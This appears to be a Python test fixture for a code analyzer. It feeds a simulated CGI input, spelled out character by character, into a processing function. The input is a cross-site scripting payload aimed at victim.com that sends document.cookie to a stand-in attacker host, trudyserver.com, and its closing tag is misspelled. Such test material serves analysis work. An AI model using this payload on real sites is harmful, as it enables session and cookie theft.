def default_mal_strlst ():
    return ['r', 'e', 'd', ' ', 'b', 'l', 'u', 'e', ' ', 't', 'h', 'r', 'e', 'e', ' ', 'h', 't', 't', 'p', ':', '/', '/', 'v', 'i', 'c', 't', 'i', 'm', '.', 'c', 'o', 'm', '/', 'p', 'o', 's', 't', '.', 'p', 'h', 'p', '?', 's', '=', '<', 's', 'c', 'r', 'i', 'p', 't', '>', 'd', 'o', 'c', 'u', 'm', 'e', 'n', 't', '.', 'l', 'o', 'c', 'a', 't', 'i', 'o', 'n', '=', "'", 't', 'r', 'u', 'd', 'y', 's', 'e', 'r', 'v', 'e', 'r', '.', 'c', 'o', 'm', '/', 'b', 'a', 'd', '.', 'p', 'h', 'p', '?', "'", ' ', '+', ' ', 'd', 'o', 'c', 'u', 'm', 'e', 'n', 't', '.', 'c', 'o', 'o', 'k', 'i', 'e', '<', '/', 's', 'c', 'i', 'p', 't', '>']

def gen_malicious_input():
    simulated_cgi_entry2 = {"terms": default_mal_strlst()}
    res = []
    return (simulated_cgi_entry2["terms"], res)
    
    
test1= test_init_input()
# for analyzer testing to check literal values
input1 = test1[0]
input2 = test1[1]
proc_results(input1, input2)

print("-------------------------------")

test2 = gen_malicious_input()
# for analyzer testing to check literal values
input3 = test2[0]
input4 = test2[1]
proc_results(input3, input4)

